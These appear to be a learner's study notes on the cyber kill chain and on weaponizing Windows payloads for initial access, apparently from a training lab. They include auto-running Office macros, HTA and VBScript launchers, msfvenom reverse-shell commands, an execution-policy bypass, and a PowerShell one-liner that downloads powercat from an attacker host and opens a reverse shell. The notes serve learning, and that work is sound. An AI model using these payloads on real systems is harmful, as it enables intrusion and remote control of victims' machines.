# Cyber kill chain


The cyberkill chain (in () is the MITRE ATT&CK)
1) Recon (recon) 
	- Obtain information on the target 	Harvesting emails, OSINT

2) Weaponization (Execution)
	- Creating payloads etc. Exploit with backdoor, malicious office document

3) Delivery (intial access)
	- How the payload will be delievered. Email, web, USB

4) Explotation (initial access)
	- Exploit the target's system to execute code 	MS17-010, Zero-Logon, etc.

5) Installation (persistence)
	- Install malware or other tooling 	Mimikatz, Rubeus, etc.

6) Command & control (C2)
	- Control the compromised asset from a remote central controller 	Empire, Cobalt Strike, etc.

7) Action on objectives (Exfiltration/impact)
	- Any end objectives: ransomware, data exfiltration, etc. 	Conti, LockBit2.0, etc.

## Weaponization

This involves creating payloads to be run on the target machine to get initial access.

### Windows Scripting Host

Windows scripting host is a built-in Windows administration tool that runs batch files to automate and manage tasks within the operating system. It is a windows native engine cscript.exe for command line scripts and wscript.exe for GUI which are responsbile for executing various windows basic scripts including vbe and vbs. Scripts are ran at the same permission level as the compromised user.

To create a simple payload using VBscript

```
Dim message
message ="hello"
MsgBox message
```

Dim declares a variable. The variable is then assigned a value and then the MsgBox function called with the variable.

THe code can be saved to a file with a .vbs extension and run using wscript.

```wscript payload.vbs``` 

Using VBscript to run exe files

```
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
```

this runs the windows calculator.

If wscript is not allowed then can use ```cscript.exe <filename>.vbs```
Also can also name the file as .txt and use an argument in wscript ```/e:VBScript``` to make it run as an vbs script.

```wscript /e:VBScript payload.txt```

### HTA

HTML applications are dynamic html pages with containing Jscript and VBScript and are executed by the mshta binary. They can be executed by web browser or on their own. They allow you to create a downloadable file that takes all the information regarding how it is displayed and rendered. 

An example of payload.
```
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```

save to a .hta file, load a python webserver on attacking machine and get the victim machine to open the file.

Can also create a hta reverse shell payload using msfvenom

```msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f hta-psh -o thm.hta```

or use metasploit using ```exploit/windows/misc/hta_server``` and visting the url provided by metasploit

### Visual Basic for Applications (VBA)

Programming language for microsoft word/excel/powerpoint etc to allow automating tasks of nearly every keyboard and mouse interaction between a user and Microsoft Office applications.

Macros are custom function written in VBA code to automate certain tasks in the applications. VBA can access the windows api and other lower level functionality. 

creating macros in word
1) open word
2) go to view -> macros
3) Give the macros a name
4) Click on macros in document 
4) Click create
5) create payload

An example of a payload
```
Sub Document_Open()
  THM
End Sub

Sub AutoOpen()
  THM
End Sub

Sub THM()
   MsgBox ("Welcome to Weaponization Room!")
End Sub
```

This payload will run as soon as the document is opened

6) Run the payload by clicking run.
7) Save the word document as a macro-enabled format such as .doc or .docm

Examples of other more useful payloads

```
Sub Document_Open()
  calc
End Sub

Sub AutoOpen()
  calc
End Sub

Sub calc()
	Dim payload As String
	payload = "calc.exe"
	CreateObject("Wscript.Shell").Run payload,0
End Sub
```

Dim declares payload as a string. CreateObject("Wscript.Shell").Run payload we create a Windows Scripting Host (WSH) object and run the payload.

Creating a payload with msfconsole to get a rev shell.
1) create payload with msfvenom ```msfvenom -p windows/meterpreter/reverse_tcp LHOST=1 LPORT= -f vba ```
**msfvenom will automatically use excel workbooks. To use word change Workbook_Open to Document_Open**
2) Create a word document like before with the macro from msfvenom
3) Open msfconsole and start multi/handler
4) wait for rev shell

### Powershell

Powershell is a OOP language executed from the Dynamic Language Runtime in .NET. To run powershell scripts

```powershell -File <file_name>```

However the execution policy will stop this from being run. To check the execution policy

```Get-ExecutionPolicy```

There are two ways to bypass execution policy, first is to change it globally for our user by turining it off 
```Set-ExecutionPolicy -Scope CurrentUser RemoteSigned```

or to run the file ignoring the execution policy

```powershell -ex bypass -File <name>.ps1```

Powercat is a ps1 script that can give us a revshell

1) Get it onto the machine, Can be done using http.server or smb from impacket
2) Start listerner
3) Run powercat (the first part of the command will get the file over http from attacking machine. If already on machine only execute after ;)
```powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACK_IP -p PORT -e cmd"```